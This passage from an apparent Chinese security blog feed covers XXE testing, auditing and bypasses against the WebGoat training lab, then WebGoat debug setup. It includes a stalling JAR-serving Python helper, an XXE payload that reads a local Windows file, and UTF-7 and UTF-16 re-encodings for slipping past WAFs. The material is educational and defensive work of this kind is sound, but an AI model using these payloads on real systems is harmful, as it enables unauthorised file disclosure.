<span class="token keyword">import</span> time <span class="token keyword">import</span> threading <span class="token keyword">import</span> socketserver <span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote <span class="token keyword">import</span> http<span class="token punctuation">.</span>client <span class="token keyword">as</span> httpc listen_host <span class="token operator">=</span> <span class="token string">'localhost'</span> listen_port <span class="token operator">=</span> <span class="token number">9999</span> jar_file <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">JarRequestHandler</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        http_req <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'New connection:'</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>client_address<span class="token punctuation">)</span>        <span class="token keyword">while</span> b<span class="token string">'\r\n\r\n'</span> <span class="token operator">not</span> <span class="token keyword">in</span> http_req<span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                http_req <span class="token operator">+=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\r\nClient req:\r\n'</span><span class="token punctuation">,</span>http_req<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                jf <span class="token operator">=</span> open<span class="token punctuation">(</span>jar_file<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>                contents <span class="token operator">=</span> jf<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                headers <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token triple-quoted-string string">'''HTTP/1.0 200 OK\r\n'''</span>                <span class="token triple-quoted-string string">'''Content-Type: application/java-archive\r\n\r\n'''</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>headers<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>contents<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>contents<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"get error at:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    jarserver <span class="token operator">=</span> socketserver<span class="token punctuation">.</span>TCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span>listen_host<span class="token punctuation">,</span>listen_port<span class="token punctuation">)</span><span class="token punctuation">,</span> JarRequestHandler<span class="token punctuation">)</span>     <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'waiting for connection...'</span><span class="token punctuation">)</span>     server_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>jarserver<span class="token punctuation">.</span>serve_forever<span class="token punctuation">)</span>     server_thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>     server_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>     server_thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-XXE漏洞挖掘"><a href="#0x03-XXE漏洞挖掘" class="headerlink" title="0x03 XXE漏洞挖掘"></a>0x03 XXE漏洞挖掘</h2><p>1.XML格式请求<br>黑盒测试中主要是对服务器可能解析XML的位置发送XXE载荷观察服务器响应，一般请求中存在<code>Content-Type: application/xml</code>或者请求体是XML格式的都可以进行测试。</p><p>2.JSON格式请求<br>在一些JSON格式的请求中可以尝试修改请求头为<code>Content-Type: application/xml</code>，对JSON接口进行XXE测试；或者对JSON格式的数据进行一些破坏来观察服务器响应，在JAVA中有时会出现相关的堆栈报错，可以观察进行处理的类，如果类同时支持XML解析，就可以进行XXE的测试。</p><p>3.文件上传XXE<br>如果支持上传XML文件或上传的文件中可以存在XML数据，就可能存在服务器解析XML的情况，在CSAWQual 2019-Web_Unagi中解析XML文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/757406732ed8f2926d57cdc6380d8fab.png"><br>另外在很多xls、xlsx等类型文件上传也会存在XML解释，可以将文件解压后在内部的XML文件中插入Payload进行测试(实例见后文绕过部分)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4eb17c6a412191e1bc51f3bb7eec119d.png"><br>如下上传xlsx文件进行XXE时遇到了后端JAVA禁用外部实体(禁用了DOCTYPE声明)的情况：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/27147480514317e34d3843b6c33bb20f.png"></p><h2 id="0x04-XXE代码审计"><a href="#0x04-XXE代码审计" class="headerlink" title="0x04 XXE代码审计"></a>0x04 XXE代码审计</h2><p>在Webgoat中，漏洞代码在webgoat-lessons中，根据漏洞名称可以找到XXE漏洞源码位置：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/5f0406856897c0d6b2b2701a31fe418e.png"><br>代码中使用Mapping注解来注册URL映射。为 <code>@PostMapping</code> 、<code>@GetMapping</code> 、 <code>@RequestMapping</code> ，根据关键字 Mapping 搜索注册的URL地址：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e105cfa46985d20928c7e69b0ee2c43d.png"><br>需要说明的是URL映射<code>xxe/comments</code> 是用来获取回显的评论数据的，可以通过这个位置来获得XXE实现后的回显数据：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/25a5044fca8cd78f6ac745568c4434c2.png"><br>在第一个文件<code>org/owasp/webgoat/xxe/BlindSendFileAssignment.java</code>中注册了<code>xxe/bind</code>路由：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6ad6b5fde3b56305c69919bc1dd29140.png"><br>程序通过<code>@RequestBody</code>注解获取请求体，注解<code>@RequestBody</code>接收的参数是来自<code>requestBody</code>中，并将其转换为String类型保存在commentStr变量中，然后检查session属性中是否设置applySecurity开启了安全模式，随后将传入的Body和安全模式状态参数secure传入parseXML进行处理：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/25607f0c34375f48b1c3642619e30e44.png"><br>接下来需要具体分析comment.parseXML函数的处理，右键选择parseXml转到实现：<br><img src="https://i.loli.net/2021/08/16/5kBpiw9Vle3JnLh.png"><br>parseXML是类Comments的一个方法，通过使用<code>javax.xml.stream.XMLInputFactory</code>和<code>javax.xml.bind.JAXBContext</code>处理XML后返回评论的内容，明显可以看到解析类的使用以及内置的缓解方法:<br><img src="https://i.loli.net/2021/08/16/Hd3ZS69DranPTxC.png"><br>内置的缓解代码通过设置JDK中XMLConstants类属性<code>ACCESS_EXTERNAL_DTD</code>和<code>ACCESS_EXTERNAL_SCHEMA</code>，在<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP备忘录</a>中有详细记录：</p><pre class="line-numbers language-java"><code class="language-java"> <span class="token comment" spellcheck="true">// 设置允许对指定协议的外部DTD和外部实体引用的访问。</span>xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_DTD<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_SCHEMA<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>直接patch代码，开启安全措施：<br><img src="https://i.loli.net/2021/08/16/su3F517QNvhPHl4.png"><br>这里错误提示为“无法读取外部文档 ‘note.dtd’, 因为 accessExternalDTD 属性设置的限制导致不允许 ‘http’ 访问”，这两个属性在JDK中的说明如下：<br><img src="https://i.loli.net/2021/08/16/T1Fd73eHgLhOl9c.png"><br>也就是这是一个白名单的设置，可以设置一些允许的协议，这里尝试允许<code>file://</code>：</p><pre class="line-numbers language-java"><code class="language-java">xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_DTD<span class="token punctuation">,</span> <span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_SCHEMA<span class="token punctuation">,</span> <span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/16/lqAS6e7nh8Zk3fi.png"><br>再来看XMLInputFactory类中安全设置，这里抛出的是“引用了实体 “r”, 但未声明它。”异常:</p><pre class="line-numbers language-java"><code class="language-java">xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLInputFactory<span class="token punctuation">.</span>SUPPORT_DTD<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//完全禁用DTD支持</span>xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLInputFactory<span class="token punctuation">.</span>IS_SUPPORTING_EXTERNAL_ENTITIES<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//禁用外部实体</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里实验开启DTD支持，但禁用外部实体，parseXml返回为””，<code>CONTENTS.contains(comment.getText())</code>会返回true:</p><pre class="line-numbers language-java"><code class="language-java">xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLInputFactory<span class="token punctuation">.</span>SUPPORT_DTD<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLInputFactory<span class="token punctuation">.</span>IS_SUPPORTING_EXTERNAL_ENTITIES<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//禁用外部实体</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/16/QMokdWAZVH8fjya.png"><br>这里的parseXml虽然返回的为””，总体来说还是返回了comment这个类，parseXml返回的只是comment.text，所以这里contains并没有异常，返回了true，等于说<code>CONTENTS.contains("")</code>返回true，参考<a href="https://blog.csdn.net/q563730343/article/details/82149601">Java Contains()方法传入空（非null）字符串的返回结果</a>。<br>所以这里读取空文件也可以让contains返回true:<br><img src="https://i.loli.net/2021/08/16/dia6U8Z7z5hyYpX.png"></p><p>经过上面的分析，在代码审计中寻找XXE漏洞，可以通过关键字寻找XML处理类的使用，并检查是否设置了安全限制(setProperty、setAttribute、setXIncludeAware、setExpandEntityReferences、setFeature)：<br>XMLInputFactory（StAX 解析器），一般的禁用代码：</p><pre class="line-numbers language-java"><code class="language-java">factory<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://apache.org/xml/features/disallow-doctype-decl"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他类的禁用代码参考：</p><pre class="line-numbers language-java"><code class="language-java"> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>XMLInputFactory <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">// This disables DTDs entirely for that factory</span>xmlInputFactory<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLInputFactory<span class="token punctuation">.</span>SUPPORT_DTD<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// disable external entities</span>xmlInputFactory<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"javax.xml.stream.isSupportingExternalEntities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>XMLConstants (包含基本 XML 值作为常量的实用程序类，可用于设置XML安全属性)</p><pre class="line-numbers language-java"><code class="language-java">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>XMLConstants<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_DTD<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_SCHEMA<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>常见XML解释类：</p><pre class="line-numbers language-java"><code class="language-java">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>XMLInputFactoryjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>JAXBContextjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span>DocumentBuilderFactoryjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span>SAXParserjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>TransformerFactoryjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>validation<span class="token punctuation">.</span>Validatorjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>validation<span class="token punctuation">.</span>SchemaFactoryjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>SAXTransformerFactoryjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>SAXSourceorg<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>XMLReaderDocumentHelper<span class="token punctuation">.</span>parseTextDocumentBuilderorg<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>helpers<span class="token punctuation">.</span>XMLReaderFactoryorg<span class="token punctuation">.</span>dom4j<span class="token punctuation">.</span>io<span class="token punctuation">.</span>SAXReaderorg<span class="token punctuation">.</span>jdom<span class="token punctuation">.</span>input<span class="token punctuation">.</span>SAXBuilderorg<span class="token punctuation">.</span>jdom2<span class="token punctuation">.</span>input<span class="token punctuation">.</span>SAXBuilderjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>Unmarshallerjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>XpathExpressionjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>XMLStreamReaderorg<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>digester3<span class="token punctuation">.</span>Digesterorg<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>SAXParseExceptionpublicId<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就针对性的对xml处理的位置进行跟踪，查看关键代码是否进行了安全处理。</p><p>更多详情：<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</a></p><h2 id="0x05-XXE绕过"><a href="#0x05-XXE绕过" class="headerlink" title="0x05 XXE绕过"></a>0x05 XXE绕过</h2><p>这两种绕过同样是在<a href="https://buuoj.cn/challenges">CSAWQual 2019-Web_Unagi</a>用到的<br>1.UTF-7编码<br>编码网页工具：<a href="http://toolswebtop.com/text/process/decode/UTF-7">http://toolswebtop.com/text/process/decode/UTF-7</a><br>将POC转换为UTF-7编码：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE users [&lt;!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" ></span>]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/361a5b90a7db17b4047fcf499545b1af.png"><br>编码结果：</p><pre class="line-numbers language-xml"><code class="language-xml">+ADwAIQ-DOCTYPE users +AFs+ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///C:/Windows/win.ini+ACI +AD4AXQA+-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>绕过WAF:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4f33d035f17ab95352749c1725a9007f.png"><br>在PhpSpreadsheet的<a href="https://github.com/PHPOffice/PhpSpreadsheet/issues/771">issues</a>中也可以看到这样的XXE绕过方式：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/da7f7abba9d6687024d4bb018e5e5612.png"></p><p>2.文件编码转换<br>将文件的编码转换为UTF16，网上大部分都是这种方法：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">iconv</span> -f utf8 -t utf16 sample.xml<span class="token operator">></span>2.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8fcc98bb7888e96239a07151dbf53df1.png"></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://github.com/PHPOffice/PhpSpreadsheet/issues/771">PhpSpreadsheet XXE</a><br><a href="https://www.cnblogs.com/zpchcbd/p/14774132.html">Java EXCEL XXE</a><br><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br><a href="https://www.ajsafe.com/news/185.html">XXE漏洞原理及利用</a><br><a href="https://gosecure.github.io/xxe-workshop/#7">Advanced XXE Exploitation</a><br><a href="https://blog.noob.ninja/spilling-local-files-via-xxe-when/">本地DTD利用</a><br><a href="https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5">微信XXE修复</a><br><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">XXE拒绝服务攻击Billion Laughs</a><br><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP XML 外部实体预防</a><br><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">利用本地 DTD 文件利用 XXE</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webgoat靶场调试环境配置</title>
      <link href="/2021/10/05/webgoat-ba-chang-diao-shi-huan-jing-pei-zhi/"/>
      <url>/2021/10/05/webgoat-ba-chang-diao-shi-huan-jing-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>选择<a href="https://www.jetbrains.com/idea/download/">IDEA</a>作为源码调试工具，<a href="https://github.com/WebGoat/WebGoat">Webgoat</a>作为漏洞分析的靶场。将项目源码下载到本地，使用IDEA调试模式编译运行Webgoat。</p><h2 id="0x02-IEAD汉化配置"><a href="#0x02-IEAD汉化配置" class="headerlink" title="0x02 IEAD汉化配置"></a>0x02 IEAD汉化配置</h2><p>在安装好IDEA后，可使用插件进行汉化，提高后续的调试效率。在File-Setting-Plugins中搜索Chinese插件安装：<br><img src="https://i.loli.net/2021/08/04/bWxUQuoqHgkiZvT.png"><br>加载插件进行使用：<br><img src="https://i.loli.net/2021/08/04/VNtxHrbmJDn6a8z.png"><br>安装完成后重启软件，界面汉化成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/0646248cf3c557b3aa777447f81b6e79.png"></p><h2 id="0x03-WebGoat配置"><a href="#0x03-WebGoat配置" class="headerlink" title="0x03 WebGoat配置"></a>0x03 WebGoat配置</h2><p>配置源码WebGoat-develop，用IDEA2021.2来导入项目(2021.2选择文件夹打开，然后手动配置；2019.3.2中可以选择导入项目自动配置。)，mavn会自动下载依赖启动：<br><img src="https://i.loli.net/2021/08/04/gQJ9ojfDzOa21R5.png"><br>mavn仓库默认在海外，配置文件默认位置在<code>C:\Users\&lt;用户名&gt;\.m2wrapper\dists\</code>中，在setting.xml中配置国内阿里云加速仓库地址：</p><pre class="line-numbers language-xml"><code class="language-xml">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrors</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>alimaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>aliyun maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://maven.aliyun.com/nexus/content/groups/public/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>repo2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>repo2 maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://repo2.maven.org/maven2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrors</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/04/tYbVoEzBQlZa1Mx.png"></p><h2 id="0x04-JDK和热重载配置"><a href="#0x04-JDK和热重载配置" class="headerlink" title="0x04 JDK和热重载配置"></a>0x04 JDK和热重载配置</h2><p>WebGoat需要使用JDK15来运行，在菜单”文件”-“项目结构”-“JDK”中配置版本为<a href="http://jdk.java.net/15/">JDK15</a>:<br><img src="https://i.loli.net/2021/08/04/VnZADElt6gWNhCu.png"><br>然后在左上角🔨图标配置菜单里选择编辑项目配置,添加一个Spring Bot配置，名称为StartWebGoat，主类org.owasp.webgoat.StartWebGoat，这一步可能输入了主类会报错，提示找不到main函数，要等idea扫描一下类，然后就自己好了:<br><img src="https://i.loli.net/2021/08/04/rdx4onaIChsplJR.png"><br>同样配置webwolf(用来验证一些请求的服务，如SSRF之类的)，下面记得设置下更新操作,用来在代码中增加语句后热重载:<br><img src="https://i.loli.net/2021/08/04/zRCi1L4muDyWs2c.png"><br>点击调试按钮，访问本地8080，程序已经运行起来了:<br><img src="https://i.loli.net/2021/08/04/OQBXF76ckWJCLVH.png"><br>然后在<code>src/main/java/org/owasp/webgoat/users/UserService.java</code>中用户名检查断点，浏览器中登录，可以看到成功命中:<br><img src="https://i.loli.net/2021/08/05/Pmfyjs37RA9eVqO.png"><br>再试试热重载，加入一条打印语句，然后重载类:<br><img src="https://i.loli.net/2021/08/05/TSQNfmFGkIe5u2q.png"><br>已经输出了调试语句:<br><img src="https://i.loli.net/2021/08/05/8vltejyMwENUs7f.png"></p><h2 id="0x04-Burp抓包配置"><a href="#0x04-Burp抓包配置" class="headerlink" title="0x04 Burp抓包配置"></a>0x04 Burp抓包配置</h2><p>Webgoat为了安全只会在本地127.0.0.1开启靶场服务，使用burp抓包的时，在Google中没法对127.0.0.1抓包。可以使用Firefox设置本地代理，在地址栏输入<code>about:config</code>，然后搜索<code>network.proxy.allow_hijacking_localhost</code>，设置为True：<br><img src="https://i.loli.net/2021/08/05/O8nuI1YxJLkUfTd.png"><br>然后就可以在Burp中拦截数据包了：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4c0c8ade47a5d71de049e8d2809b9263.png"></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a><br><a href="https://owasp.org/www-project-webgoat/">https://owasp.org/www-project-webgoat/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 靶场环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
            <tag> Webgoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike流量伪装与安全配置</title>
      <link href="/2021/08/19/cobaltstrike-liu-liang-yin-cang-yu-an-quan-pei-zhi/"/>
      <url>/2021/08/19/cobaltstrike-liu-liang-yin-cang-yu-an-quan-pei-zhi/</url>
      
